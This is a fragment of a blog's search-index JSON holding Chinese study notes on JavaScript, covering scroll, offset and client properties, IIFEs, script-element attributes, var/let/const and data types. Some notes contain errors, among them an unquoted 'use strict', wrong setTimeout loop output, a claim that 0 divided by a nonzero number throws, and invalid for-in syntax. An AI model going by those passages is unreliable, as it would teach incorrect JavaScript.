})\n</script>\n~~~\n\n\n\n#### 3.4 页面被卷去的头部兼容性解决方案\n\n因此被卷去的头部通常有如下几种写法：\n\n1. 声明了DTD(`<!DOCTYPE html>`)，使用`document.documentElement.scrollTop`\n\n2. 未声明DTD，使用`document.body.scrollTop`\n\n3. 新方法`window.pageYOffset `和 `window.pageXOffset` ，IE9开始支持\n\n   ~~~js\n   function getScroll(){\n       return{\n           left:window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0;\n           top:window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;\n       };\n   }\n   \n   //使用时 getScroll().left\n   ~~~\n\n\n\n### 三大系列总结\n\n| 三大系列大小对比    | 作用                                |\n| ------------------- | ----------------------------------- |\n| element.offsetWidth | 返回自身+padding+边框，内容区的宽度 |\n| element.clientWidth | 返回自身+padding，内容区的宽度      |\n| element.scrollWidth | 返回自身实际宽度，+padding          |\n\n<img src='https://s1.328888.xyz/2022/04/09/XnzVM.png'>\n\n#### 主要用法：\n\n1. offset 系列：获取元素的位置 <font color='red'>offsetLeft   offsetTop</font>\n2. client 系列：获取元素大小  <font color='red'>clientWidth   clientHeight</font>\n3. scroll系列：获取滚动距离  <font color='red'>scrollTop   scrollLeft</font>\n4.  <font color='red'>页面的滚动距离</font>通过 <font color='red'>window.pageXOffset</font> 获得\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js"],"categories":["learningNotes"]},{"title":"立即执行函数","url":"/learningNotes/js/立即执行函数","content":"\n~~~js\n//普通函数 写完函数 + 调用\nfunction fn(){\n    console.log(1);\n}\nfn();\n\n//1.立即执行函数：不需要调用 马上执行\n//2.写法：\n// (function(){})()  /  (function(){}());\n\n//第二个小括号 相当于 调用的作用\n(function(){\n    console.log(1)\n})();  \n//if有多个立即执行函数 要用分号隔开\n\n//第二个小括号 也可以传参\n(function(a){\n    console.log(a);\n})(1)\n\n//也可以非匿名函数\n(function sum(a, b){\n    console.log(a + b);\n})(1 , 2)\n\n//第二个写法与第一个相同\n\n//3.最大的作用是 独立创建了一个作用域 避免了命名冲突问题\n~~~\n\n","tags":["js"],"categories":["learningNotes"]},{"title":"红宝书 - 3.4数据类型","url":"/readNotes/3.4数据类型","content":"\nECMAScript有6种简单数据类型/原始类型、一种复杂数据类型；\n\n简单数据类型：Undefined、Null、Boolean、Number、String、Symbol。（Symbol是es6新增的）\n\n复杂数据类型：Object（对象）\n\n\n\n### 3.4.1 typeof操作符\n\n因为ECMAScript的类型系统是松散的，所以需要一种手段来确定任意变量的数据类型。对一个值使用typeof操作符会返回下列字符串之一：\n\n* `undefined` 值未定义\n* `boolean` 值为布尔值\n* `string` 值为字符串\n* `number` 值为数据\n* `object`  值为对象/null（因为null被认为是一个对空对象的引用）\n* `function` 值为函数\n* `symbol` 值为符号\n\n~~~js\nlet message = \"some string\";\nconsole.log(typeof message); //\"string\"\nconsole.log(typeof (message)); //\"string\"\nconsole.log(typeof 95)  //\"number\"\n\n//typeof是一个操作符而不是函数，所以不需要参数 但也可以使用参数\n~~~\n\n\n\n### 3.4.2 Undefined类型\n\n#### \t1.Undefined类型只有一个值⇨undefined\n\n未经初始化的变量，默认初始值为undefined。\n\n<font color='red'>所以给变量显示以undefined来初始化是不必要的</font>\n\n####  \t2.未初始化和未定义变量的区别：\n\n~~~js\nlet message;\n\nconsole.log(message);  //undefined\nconsole.log(age);      //报错\n//非严格模式下：对未声明的变量调用delete不会报错，但这个操作无用，严格模式下：会报错\n\nconsole.log(typeof message);  //undefined\nconsole.log(typeof age);      //undefined\n//虽然这两个变量存在根本性差异，但他们都无法执行实际操作\n~~~\n\n建议在声明变量的同时进行初始化，这样当typeof返回undefined时，就知道是给定变量未声明。\n\n#### \t3.用更简洁的方式检测undefined\n\n[^假值]: 在JavaScript中，`false`、`null`、`0`、`“”`、`undefined`、`NaN`被称为假值\n\nundefined是一个[^假值]，所以如果需要也可以用更简洁的方式检测。因为有好几个假值，所以一定要明确自己想检测的就是undefined这个字面值而不仅仅是假值。\n\n~~~ js\nlet message;\nif(message){}  //不会执行\nif(!message){}  //会执行\nif(age){}      //会报错\n~~~\n\n\n\n\n\n### 3.4.3 Null类型\n\n#### \t1.Null类型只有一个值⇨null\n\n逻辑上讲，null表示一个空对象指针，这也是 “typeof null” 会返回 ”object” 的原因：\n\n~~~js\nlet car = null;\nconsole.log(typeof car); //\"object\"\n~~~\n\n<font color='red'>在定义将来要保存对象值的变量时，建议使用null来初始化</font>，不使用其他值，这样只要检测这个变量的值是不是null就可以知道这个变量是否在后来被重新赋予了一个对象的引用\n\n#### \t2.null == undefined\n\nundefined值是由null值派生的，所以ECMA-262将其定义为表面上相等：\n\n~~~js\nconsole.log(null == undefined);  //true\nconsole.log(null === undefined); //false\n~~~\n\n但用途是完全不一样的：永远不必显示地将变量值设为undefined，但只要变量保存对象，而当时又无对象可保存，就要用null来填充。这样就可以保持null是空对象指针的语义，并进一步与undefined区分开\n\n#### \t3.用更简洁的的方式检测null\n\nnull是一个[^假值]，所以如果需要也可以用更简洁的方式检测。因为有好几个假值，所以一定要明确自己想检测的就是null这个字面值而不仅仅是假值。\n\n~~~js\nlet message = null;\nlet age;\nif(message){}  //不执行\nif(!message){} //执行\nif(age){}      //不执行\nif(!age){}     //执行\n~~~\n\n\n\n### 3.4.4 Boolean类型\n\n#### \t1.Boolean类型有两个字面值⇨true、false\n\n> 这两个布尔值不同于数值，因此 true != 1，false != 0。\n\n<font color='red'>布尔值字面量 true 和 false 区分大小写，因此 True 和 False（及其他大小混写形式） 是有效的标识符</font>\n\n#### \t2.所有其他 ECMAScript 类型的值都有相应布尔值的等价形式\n\n要将一个其 他类型的值转换为布尔值，可以调用特定的 Boolean()转型函数：\n\n~~~js\nlet message = \"Hello world\";\nlet messageAsBoolean = Boolean(message); //true\n~~~\n\n#### \t3.不同类型与布尔值之间的转换规则\n\n| 数据类型  | 转换为true             | 转换为false    |\n| --------- | ---------------------- | -------------- |\n| Boolean   | true                   | false          |\n| String    | 非空字符串             | “”（空字符串） |\n| Number    | 非零数值（包括无穷值） | 0、NaN         |\n| Object    | 任意对象               | null           |\n| Undefined |                        | undefined      |\n\n### 3.4.5 Number类型\n\nNumber 类型使用 IEEE 754 格式表示整 数和浮点值（在某些语言中也叫双精度值）。\n\n#### \t1.不同的数值类型有不同的数值字面量格式\n\n##### \t\t\t最基本的数值字面量格式是十进制整数，\n\n直接写出来即可\n\n~~~js\nlet intNum = 55;  \n~~~\n\n##### \t\t\t也可以用八进制（以 8 为基数）字面量表示\n\n第一个数字必须是零（0），然后是相应的八进制数字（数值 0~7））。如果字面量中包含的数字超出了应 有的范围，就会忽略前缀的零，后面的数字序列会被当成十进制数：\n\n~~~js\nlet octalNum1 = 070; // 八进制的 56\nlet octalNum2 = 079; // 无效的八进制值，当成 79 处理\nlet octalNum3 = 08; // 无效的八进制值，当成 8 处理\n\n//八进制字面量在严格模式下是无效的，会导致 JavaScript 引擎抛出语法错误\n~~~\n\n##### \t\t\t或十六进制（以 16 为基数）字面量表示\n\n必须让真正的数值前缀 0x（区分大小写），然后是十六进制数字（0~9 以 及 A~F）。十六进制数字中的字母大小写均可。\n\n~~~js\nlet hexNum1 = 0xA; // 十六进制 10\nlet hexNum2 = 0x1f; // 十六进制 31 \n~~~\n\n> 使用八进制和十六进制格式创建的数值在所有数学操作中都被视为十进制数值\n\n#### \t2.浮点值\n\n要定义浮点值，数值中必须包含小数点，而且小数点后面必须至少有一个数字。\n\n> 虽然小数点前面不是必须有整数，但推荐加上\n\n~~~js\nlet floatNum1 = 1.1;\nlet floatNum2 = 0.1;\nlet floatNum3 = .1; // 有效，但不推荐\n~~~\n\n因为存储浮点值使用的内存空间是存储整数值的两倍，所以 ECMAScript 总是想方设法把值转换为 整数。在小数点后面没有数字或者是`.0`的情况下，数值就会变成整数。\n\n~~~js\nlet floatNum1 = 1.; // 小数点后面没有数字，当成整数 1 处理\nlet floatNum2 = 10.0; // 小数点后面是零，当成整数 10 处理\n~~~\n\n#### \t3.科学计数法\n\nECMAScript 中科学记数法的格式要求是一个数值（整数或浮点数）后跟一个大 写或小写的字母 e，再加上一个要乘的 10 的多少次幂。比如：\n\n~~~js\nlet floatNum = 3.125e7; // 等于 31250000 \nlet folatNum = 3e-17;  // 等于 0.000 000 000 000 000 03\n~~~\n\n浮点值的精确度最高可达 17 位小数，但在算术计算中远不如整数精确。\n\n例如，<font color='red'>0.1 加 0.2 得到的不 是 0.3，而是 0.300 000 000 000 000 04。</font>由于这种微小的舍入错误，导致很难测试特定的浮点值。\n\n~~~js\nif (a + b == 0.3) { // 别这么干！\n console.log(\"You got 0.3.\");\n} \n//这里检测两个数值之和是否等于 0.3。如果两个数值分别是 0.05 和 0.25，或者 0.15 和 0.15，那没问题。但如果是 0.1 和 0.2，如前所述，测试将失败。\n~~~\n\n#### \t4.值的范围\n\n由于内存的限制，ECMAScript 可表示的\n\n最小数值保存在 `Number.MIN_VALUE` 中， 5e-324；\n\n最大数值保存在 `Number.MAX_VALUE` 中，1.797 693 134 862 315 7e+308。\n\n如果数值超出了 JavaScript 可表示的范围，那么这个数值会被自动转换为一个特殊的 Infinity（无 穷）值。任何无法表示的负数以-Infinity（负无穷大）表示，任何无法表示的正数以 Infinity（正 无穷大）表示。如果计算返回正 Infinity 或负 Infinity，则该值将不能再进一步用于任何计算。\n\n> 使用 Number.NEGATIVE_INFINITY 和 Number.POSITIVE_INFINITY 也可以获 取正、负 Infinity。没错，这两个属性包含的值分别就是-Infinity 和 Infinity。\n\n#### \t5.NaN\n\n有一个特殊的数值叫 NaN，意思是“不是数值”（Not a Number），用于表示本来要返回数值的操作 失败了（而不是抛出错误）。\n\n* 0 / 非0 ： 报错\n* 0 / 0     ：NaN\n* 非0 / 0 ：Infinity / - Infinity\n\nNaN有几个独特的特性：\n\n* 任何涉及 NaN 的操作始终返回 NaN（如 NaN/10）\n* NaN 不等于包括 NaN 在内的任何值\n\n~~~js\nconsole.log(NaN == NaN); // false \n~~~\n\nECMAScript 提供了` isNaN()`函数。该函数接收一个参数，可以是任意数据类型，判断参数是否“不是数值”。把一个值传给 isNaN()后，该函数会尝试把它转换为数值。某些非数值的 值可以直接转换成数值，如字符串\"10\"或布尔值。\n\n~~~js\nconsole.log(isNaN(NaN)); // true\nconsole.log(isNaN(10)); // false，10 是数值\nconsole.log(isNaN(\"10\")); // false，可以转换为数值 10\nconsole.log(isNaN(\"blue\")); // true，不可以转换为数值\nconsole.log(isNaN(true)); // false，可以转换为数值 1\n~~~\n\n#### \t6.数值转换\n\n有 3 个函数可以将非数值转换为数值：`Number()`、`parseInt()`和 `parseFloat()`\n\n`Number()`是转型函数，可用于任何数据类型。后两个函数主要用于将字符串转换为数值。\n\n##### \t\tNumber()函数基于如下规则执行转换：\n\n* `布尔值`，`true ` ⇨ 1，`false` ⇨ 0\n* `数值`，直接返回\n* `null` ⇨ 0\n* `undefined` ⇨ `NaN`\n* `字符串`，应用以下规则：\n  * 如果包含数值字符，包括数值字符前面带加、减号的情况，⇨ 一个十进制数值\n  * 如果包含有效的浮点值格式如\"1.1\"，⇨ 相应的浮点值\n  * 如果包含有效的十六进制格式如\"0xf\"，⇨ 与该十六进制值对应的十进制整数值\n  * 如果是空字符串（不包含字符）⇨ 0\n  * 如果包含除上述情况之外的其他字符，则返回 NaN\n* `对象`，调用 valueOf()方法，并按照上述规则转换返回的值。如果转换结果是 NaN，则调用 toString()方法，再按照转换字符串的规则转换。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js"],"categories":["readNotes"]},{"title":"红宝书 - 第 3 章 语言基础","url":"/readNotes/3.语言基础","content":"\n\n任何语言的核心所描述的都是真语言再最基本的层面上如何工作，涉及语法、操作符、数据类型以及内置功能、再此基础上才可以构建复杂的解决方案。ECMA-262以一个名为ECMAScript的伪语言的形式，定义了JavaScript的所有这些方面。\n\n本章的内容主要基于ECMAScript第6版。\n\n## 3.1 语法\n\n### 3.1.1 区分大小写\n\nECMAScript中一切都区分大小写。无论是变量、函数名、操作符，都区分大小写。\n\n### 3.1.2 标识符\n\n**标识符**：变量、函数、属性、函数参数的名称。\n\n命名规则：\n\n* 第一个字符必须是字母/下划线_/美元符号$\n* 剩下的字符可以是字母/下划线/美元符号/数字\n* 关键字、保留字、true、false、null不能作为标识符\n\n> 标识符中的字母可以是扩展ASCII中的字母，也可以是Unicode的字母字符。\n\n按照惯例，ECMAScript标识符使用驼峰大小写形式。\n\n> 虽然不是强制性，但因为这种形式跟ECMAScript内置函数和对象的命名方式一致，所以是最佳实现\n\n### 3.1.3 注释\n\n`//` 单行注释\n\n`/*` 多行注释 `*/`\n\n### 3.1.4 严格模式\n\nECMAScript 5 增加了严格模式的概念。其是一种不同的JavaScript解析和执行模型，ECMAScript 3 的一些不规范写法在这种模式下会被处理，对于不安全的活动将抛出错误。\n\n* 要对整个脚本启用严格模式，在脚本开头加上：`use strict;`\n\n看起来像没有赋值给任何变量的字符串，但它其实是一个预处理指令。任何支持的JavaScript引擎看到它都会切换严格模式。选择这种语法形式的目的是不破坏ECMAScript 3语法。\n\n* 也可以单独指定一个函数在严格模式下执行，只要把这个预处理指令放到函数体开头就可以：\n\n  ~~~JavaScript\n  function do(){\n      use strict;\n  }\n  ~~~\n\n\n\n> 严格模式会影响JavaScript执行的很多方面；所有现代浏览器都支持严格模式\n\n\n\n### 3.1.5 语句\n\n* ECMAScript语句以分号结尾，虽然不是必需的，但推荐加上。\n\n> 加分号便于开发者通过删除空行来压缩代码（如果没有分号，只删除空行，则会导致语法错误）\n>\n> 也有助于在某些情况提升性能，因为解析器会尝试在合适的位置补上分号以纠正语法错误\n\n* 多条语句可以合并到代码块中`{}`。\n\n* `if`之类的控制语句只在执行多条语句时必须有代码块。\n\n\n\n## 3.2 关键字与保留字\n\nECMA-262描述了一组**保留的关键字**，这些关键字有特殊用途，比如表示控制语句的开始和结束… 按照规定，保留的关键字不能用作标识符或属性名。\n\nECMA-262 第6版规定的所有关键字如下：\n\n| break    | do       | in         | typeof |\n| -------- | -------- | ---------- | ------ |\n| case     | else     | instanceof | var    |\n| catch    | export   | new        | void   |\n| class    | extends  | return     | while  |\n| const    | finally  | super      | with   |\n| continue | for      | switch     | yield  |\n| debugger | function | this       |        |\n| default  | if       | throw      |        |\n| delete   | import   | try        |        |\n\n规范中也描述了一组**未来的保留字**，同样不能用作标识符或属性名。以下是ECMA-262 第6版 为将来保留的所有词汇\n\n* 始终保留 `enum`\n* 严格模式下保留`implement` `package` `public` `interface` `protected` `static` `let` `private` \n* 模块代码中保留 `await`\n\n> 这些词汇不能用作标识符，但还能用作对象的属性名。一般来说，不推荐使用。\n\n\n\n## 3.3 变量\n\nECMAScript变量是松散类型的，即变量可以用于保存任何类型的数据。每个变量只不过是一个用于保存任意值的命名占位符。\n\n有3个关键字可以声明变量：\n\n1. `var` ：在ECMAScript的所有版本中都可以使用\n2. `const` ：ECMAScript 6 及更晚的版本中使用\n3. `let` ：ECMAScript 6 及更晚的版本中使用\n\n### 3.3.1 ` var`关键字\n\n要定义变量，可以使用`var`操作符，后面跟变量名： `var message`\n\nECMAScript实现变量初始化，因此可以同时定义变量并设置它的值：`var message = \"hi\";`\n\n> 像这样初始化变量不会将它表示为字符串类型，只是简单的赋值而已；\n>\n> 随后不仅可以改变保存的值，也可以改变值的类型\n\n~~~javascript\nvar message = \"hi\";\nmessage = 100; //合法，但不推荐\n~~~\n\n1. **var声明作用域**\n\n   使用`var`操作符定义的变量会成为包含它的函数的局部变量。\n\n   > 比如，使用var在一个函数内部定义一个变量，就意味着该变量将在函数退出时被销毁：\n\n   ~~~JavaScript\n   function test(){\n       var message = \"hi\"; //局部变量\n   }\n   test();\n   console.log(message); //出错\n   ~~~\n\n   <font color='red'>在函数内定义变量时省略var操作符，可以创建一个全局变量</font>\n\n   ~~~javascript\n   function test(){\n       var message = \"hi\"; //全局变量\n   }\n   test();\n   console.log(message); // “hi”\n   ~~~\n\n   > 不推荐这么做，在局部作用域中定义的全局变量很难维护。\n   >\n   > 也会造成困扰，因为不能瞬间断定省略var是不是有意为之。\n   >\n   > 在**严格模式**下，如果像这样给未声明的变量赋值，会导致抛出ReferenceError。\n\n   如果定义多个变量，可以在一条语句中用逗号分隔每个变量：\n\n   ~~~javascript\n   var message = \"hi\",\n       found = false,\n       age = 29;\n   //因为ECMAScript时松散类型的，所以可以使用不同数据类型初始化的变量可以用一条语句来声明\n   ~~~\n\n   > 在**严格模式**下，不能定义`eval`和`arguments`的变量，否则会导致语法错误\n\n2. **var声明提升**\n\n   <font color='red'>使用`var`声明的变量会自动提升到函数作用域顶部</font>\n\n   ~~~JavaScript\n   function foo(){\n       console.log(age);\n       var age = 26;\n   }\n   foo(); //undefined\n   ~~~\n\n   上述代码等同于\n\n   ~~~javascript\n   function foo(){\n       var age;    //所谓的“提升”\n       console.log(age);\n       age = 26;\n   }\n   foo(); //undefined\n   ~~~\n\n\n\n### 3.3.2 let声明\n\n* `let`声明的范围的块作用域，而`var`声明的范围是函数作用域\n\n  > 块作用域是函数作用域的子集\n\n  ~~~javascript\n  //var\n  if(true){\n      var name= 'Matt';\n      console.log(name); //Matt\n  }\n  console.log(name); //Matt\n  \n  //let\n  if(true){\n      let age = 26;\n      console.log(age); //26\n  }\n  console.log(age); //ReferenceError:age没有定义\n  ~~~\n\n* `let`不允许同一个块作用域出现冗余声明\n\n   ~~~javascript\n   var name;\n   var name;\n   \n   let age;\n   let age; //SyntaxError; 标识符age\n   ~~~\n\n* 已经声明JavaScript引擎会记录用于变量声明的标识符及其所在的块作用域\n\n   嵌套使用相同的标识符不会报错，因为同一个块中没有重复声明\n\n   \n 1. **暂时性死区**：\n\n    `let`声明的变量不会在作用域中被提升\n\n    ~~~javascript\n    //name会被提升\n    console.log(name);  //undefined\n    var name = 'Matt';\n    \n    //age不会被提升\n    console.log(age);   //ReferenceError:age没有定义\n    let age = 26;\n    ~~~\n\n    在解析代码时，JavaScript引擎也会注意出现在块后面的let声明，只不过在此之前不能以任何方式来引用未声明的变量。在let声明之前的执行瞬间被称为“暂时性死区”，在此阶段引用任何后面才声明的变量都会抛出`ReferenceError`\n\n 2. **全局声明**：\n\n    与`var`不同，使用`let`在全局作用域中声明的变量不会成为`window`对象的属性\n\n    ~~~javascript\n    var name = 'Matt';\n    console.log(window.name); //'Matt'\n    \n    let age = 26;\n    console.log(window.age); //undefined\n    ~~~\n\n    不过`let`声明仍然是在全局作用域中发生的，相应变量会在页面的生命周期内存续。因此，为了避免`SyntaxError`，必须确保页面不会重复声明同一个变量\n\n 3. **条件声明**：\n\n    在使用`var`声明变量时，由于声明会被提升，JavaScript引擎会自动将多余的声明在作用域顶部合并为一个声明。\n\n    `let`的作用域是块，所以不可能检查前面是否已经使用let声明过同名变量，也就不可能在没有声明的情况声明它。\n\n    ~~~html\n    <script>\n    \tvar name = 'Maiy';\n        let age = 26;\n    </script>\n    \n    <script>\n    \t//假设脚本不确定页面是否已经声明了同名变量  那可以假设还没声明过\n        var name = 'Matt';  //没有错误，因为可以被作为一个提升声明来处理  不需要检查之前是否声明过同名变量\n        \n        let age = 36; //如果之前声明过，这里会报错\n    </script>\n    ~~~\n\n    使用`try/catch`语句或`typeof`操作符也不能解决，因为条件块中`let`声明的作用域仅限于该块。\n\n    ~~~html\n    <script>\n    \tlet name = 'Maiy';\n        let age = 26;\n    </script>\n    \n    <script>\n    \t//假设脚本不确定页面是否已经声明了同名变量  那可以假设还没声明过\n        if(typeof name === 'undefined'){\n            let name;\n            //name 被限制在if块作用域内  这个赋值形同全局赋值\n        }\n        name = 'Matt';\n       \n        try{\n            console.log(age);  //若无声明过则会报错\n        }\n        catch(error){\n            let age;\n            //age被限制在catch块的作用域内  这个赋值形同全局赋值\n        }\n        age = 26;\n    </script>\n    ~~~\n\n    > 对于let不能依赖条件声明模式\n\n 4. **for循环中的let声明**：\n\n    在`let`出现之前，`for`循环定义的迭代变量会渗透到循环体外部;\n\n    改使用`let`之后，就没有这个问题了，因为迭代变量的作用域仅限于`for`循环块内部；\n\n    ~~~javascript\n    for(var i = 0 ; i < 5 ; ++i){\n        //循环逻辑\n    }\n    console.log(i); // 5\n    \n    for(let i = 0 ; i < 5 ; ++i){\n        //循环逻辑\n    }\n    console.log(i); //ReferenceError：i没有定义\n    ~~~\n\n    在使用`var`时，最常见的问题就是对迭代遍历的奇特声明和修改：\n\n    ~~~javascript\n    for(var i = 0 ; i < 5 ; i++){\n        setTimeout( () => console.log(i) , 0)   //5 5 5 5 5\n    }\n    //因为在退出循环时，迭代变量保存的是导致循环退出的值，所以在之后执行超时逻辑是，所有的i都是同一个变量，因而输出同一个值\n    \n    for(let i = 0 ; i < 5 ; i ++){\n        setTimeout( () => console.log(i) , 0)   //1 2 3 4 5\n    }\n    //使用let迭代变量时，JavaScript引擎在后台会为每个迭代循环声明一个新的迭代变量。每个setTimeout引用的都是不同的变量实例。\n    ~~~\n\n    > 这种每次迭代声明一个独立变量实例的行为适用于所有风格for循环，包括`for-in`和`for-of`循环\n\n    \n\n   ### 3.3.3 const声明\n\n`const`的行为于`let`基本相同，唯一一个重要的区别：\n\n用`const`声明变量时，必须同时初始化变量，且尝试修改`const`声明的变量会导致运行错误。\n\n~~~javascript\nconst age = 26;\nage = 36; //TypeError：给常量赋值\n\n//const也不允许重复声明\nconst name = 'Matt';\nconst name = 'Maiy'; //SyntaxError\n\n//const声明的作用域也是块\nconst name = 'MAtt';\nif(true){\n    const name = 'Maiy';\n}\nconsole.log(name); //MAtt\n~~~\n\n`const`声明的限制只适用于它指向的变量的引用。\n\n即如果`const`变量引用的是一个对象，那么修改这个对象内部的属性并 不违反`const`的限制\n\n~~~javascript\nconst person = {};\nperson.name = 'Matt'; //没有语法错误\n~~~\n\n不能用`const`来声明迭代变量，因为迭代变量会自增\n\n~~~javascript\nfor(const i = 0 ; i <  ; i ++){} //TypeError:给常量赋值\n~~~\n\n若只想用`const`声明一个不会被修改的`for`循环变量，也是可以的。\n\n即每次迭代只是创建一个新变量，这对`for-of`和`for-in`循环特别有意义\n\n   ~~~javascript\nlet i = 0;\nfor(const j = 7 ; i < 5 ; i ++){\n    console.log(j);    // 7 7 7 7 7 \n}\n\nfor(const key in a: 1 , b: 2){\n    console.log(key);  //a b\n}\n\nfor(const value of [1,2,3,4,5]){\n    console.log(value); //1 2 3 4 5\n}\n   ~~~\n\n\n\n###  3.3.4声明风格及最佳实践\n\n1. 不使用`var`\n\n   限制自己只使用`let`和`const`有助于提升代码质量，因为变量有了明确的作用域、声明位置、以及不变的值。\n\n2. `const`优先，`let`次之\n\n   使用`const`声明可以让浏览器运行时强制保持变量不变，也可以让静态代码分析工具提前发现不合法的赋值操作。\n\n   只在提前知道未来会有修改时，再改用`let`.\n\n   > 这样可以让开发者更有信心地推断某些变量的值永远不会变，同时也能迅速发现因意外赋值导致的非预期行为。\n\n\n\n## 3.4 数据类型\n\n\n\n   \n\n   \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js"],"categories":["readNotes"]},{"title":"红宝书 - 第2章 HTML中的JavaScript","url":"/readNotes/2.HTML中的JavaScript","content":"\n> 在JavaScript早期，网景公司的工作人员希望在将JavaScript引入HTML页面的同时，不会导致页面在其他浏览器中渲染初问题\n>\n> 最终他们达成了向网页中引入通用脚本能力的共识\n>\n> 当初他们的工作得到了保留，并且最终形成了HTML规范\n\n\n\n## 2.1 `<script>`元素\n\n> 将JavaScript插入HTML的主要方法是使用`<script>`元素。这个元素是由网景公司创造出来，并最早在Netscape Navigator2 中实现的。后来，这个元素被正式加入到HTML规范。\n\n1. **其有以下8个属性**：\n\n| 属性名      | 状态                          | 作用                                                         | 使用                                |\n| ----------- | ----------------------------- | ------------------------------------------------------------ | ----------------------------------- |\n| async       | 可选                          | 立即开始下载文件，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载 | 外部脚本                            |\n| charset     | 可选                          | 使用src属性指定的代码字符集                                  | 少用，大多浏览器不在乎它的值        |\n| crossorigin | 可选                          | 配置相关请求的CORS（跨源资源共享）设置，<br />crossorigin=“anonymous”配置文件请求不必设置凭据标志<br />crossorigin=“use-credentials”设置凭据标志，意味着出站请求会包含凭据 | 默认不使用CORS                      |\n| defer       | 可选                          | 表示脚本可以延迟到文档完全被解析和显示之后再执行             | 外部脚本，IE7及更早版本，行内也有效 |\n| integrity   | 可选                          | 允许对比接收到的资源和指定的加密签名以验证子资源完整性（SRI，Subresource Integrity），如果接收到的资源的签名与这个属性指定的签名不匹配，则页面会报错，脚本不会执行。这个属性可以用于确保内容分发网络（CDN，Content Delivery Network）不会提供恶意内容 |                                     |\n| language    | <font color='red'>废弃</font> | 最初用于表示代码块中的脚本语言（如：”JavaScript“、”JavaScript1.2“，”VBScript“） | 大多数浏览器都会忽略这个属性        |\n| src         | 可选                          | 表示包含要执行的代码的外部文件                               |                                     |\n| type        | 可选                          | 代替language，表示代码块中脚本语言的内容类型（MIME类型）     |                                     |\n\n> type中：按照惯例，这个值始终都是”text/javascript“，尽管”text/javascript“和”text/ecmascript“都已经废弃了，\n>\n> javascript文件的MIME类型通常是”application/x-javascript“，不过给type这个值有可能导致脚本被忽略。\n>\n> 在非IE浏览器中有效的其他值还有”application/javascript“和”application/javascript“。\n>\n> 如果这个值是module，则代码会被当成es6模块，只有这时候代码中才能出现import和export关键字\n\n2. **使用`<script>`的方式**：\n\n* 通过它直接在网页中嵌入JavaScript代码\n  * 直接把代码放在`<script>`元素中就行\n  * 在`<script>`元素中的代码被计算完成前，页面的其余内容不会被加载，也不会被显示\n  * 注意代码中不能出现`</script>`字符串，否则会报错\n  * if要避免上述问题，只需转义字符“\\”\n\n* 通过它在网页中包含外部JavaScript文件\n\n  * 必须使用src属性\n  * 与解释行内一样，解释外部JavaScript文件时，页面会阻塞（阻塞时间包含下载文件的时间）\n  * 在XHTML中，可以`<script src='excample.js' />`，但其是无效的HTML，有些浏览器不能正常处理\n  * 其url指向的资源可以与其HTML页面不在同一个域中\n    * 例如`<script src='http://www.somewhere.com/afile.js'></script>`\n    * 浏览器在解析这个资源时，会向src属性指定的路径发送一个GET请求，以取得相应资源\n    * 这个初始请求不受浏览器同源策略限制\n    * 返回并被执行的JavaScript受限制\n    * 这个请求仍然受父页面HTTP/HTTPS协议的限制\n  * 来自外部域的代码会被当成加载它的页面的一部分来加载和解释\n    * 这个能力可以让我们通过不同的域分发JavaScript\n    * 若引用了别人服务器上的文件，要确保文件不会被替换\n\n  > 使用了src属性的`<script>`元素不应该在标签中再包含其他JavaScript代码，否则浏览器只会下载执行脚本文件，从而忽略行内代码\n\n\n\n### 2.1.1 标签位置\n\n* 放在`<head></head>`标签内（过去）\n\n  > 意味着必须把所有的JavaScript代码都下载、解析和解释完成后，才能开始渲染页面，\n  >\n  > 若有很多JavaScript文件的页面，会有明显的延迟\n\n* `<body>`元素中的页面内容后面（现代web应用程序）\n\n\n\n### 2.1.2 推迟执行脚本<font color='red'>`defer`</font>\n\nHTML4.01定义了`defer`属性，表示脚本在执行时不会改变页面的结构。即脚本会被延迟到整个页面都解析完毕后再运行\n\n> 告诉浏览器立即下载，但延迟执行\n\n~~~html\n<head>\n\t<script defer src='example.js'></script>\n    <!-- if XHTML \n\tdefer=\"defer\"\n\t-->\n</head>\n~~~\n\nHTML5规范要求脚本应该按照他们出现的顺序执行，且均会在DOMContentLoaded事件之前执行；\n\n但实际中，推迟执行的脚本不一定总会按照顺序执行或者再DOMContentLoaded事件之前执行；\n\n因此最好只包含一个这样的脚本。\n\n> 对`defer`属性的支持时从IE4、Firefox3.5、Safari5和Chrome7开始的。其他浏览器会忽略这个属性，所以还是把要延迟的脚本放在页面底部比较好\n\n### 2.1.3 异步执行脚本\n\nHTML5定义了`async`属性，其与`defer`类似，都只适用于外部脚本，都会告诉浏览器立即开始下载。\n\n但`async`不能保证他们按照他们出现的次序执行\n\n~~~html\n<head>\n    <script async src='example1.js'></script>\n    <script async src='example2.js'></script>\n    <!-- if XHTML \n\tasync=\"async\"\n\t-->\n</head>\n~~~\n\n> 告诉浏览器，不必等脚本下载和执行完后再加载页面，同样也不必等到该异步脚本下载和执行后再加载其他脚本，所以异步脚本不应该在加载期间修改DOM。\n\n异步脚本保证会在load事件前执行，但可能会在DOMContentLoaded之前/后；\n\n使用其也会告诉页面，你不会使用document.write；\n\n> Firefox3.6、Safari5和Chrome7支持异步脚本；\n\n### 2.1.4 动态加载脚本\n\n因为JavaScript可以使用DOM API，所以通过向DOM中动态添加`script`元素同样可以加载指定的脚本\n\n~~~JavaScript\nlet script = document.createElement('script'); //创建\nscript.src='gibbarish.js';\n//默认以这种方式创建的`script`是异步加载的，相当于添加了async，但可能会有问题\n//因为所有浏览器支持createElement()方法，但不是所有浏览器都支持async属性\n//所以为了统一动态脚本的加载行为，可以明确将其设置为同步加载\nscript.async=false;\ndocument.head.appendChild(script);//添加到页面上\n~~~\n\n> 以这种方式获取的资源对浏览器预加载器是不可见的，会影响它们在资源获取队列中的优先级。根据应用程序的工作方式以及怎么使用，这种方式可能会严重影响性能\n\n要想让预加载器知道这些动态请求文件的存在，可以在文档头部显示声明它们：\n\n~~~html\n<link rel='preload' href='gibberish.js'>\n~~~\n\n### 2.1.5 XHTML中的变化\n\n可扩展性文本标记语言（XHTML，Extensible HyperText Markup Language）是将HTML作为XML的应用重新包装的结果。\n\n在XTML中使用JavaScript必须指定`type=text/javascript`，HTML则可以没有。\n\n> XHTML虽然已经退出历史舞台，但实践中偶尔可能也会遇到遗留代码\n\n在XHTML中编写代码比较严格，\n\n* 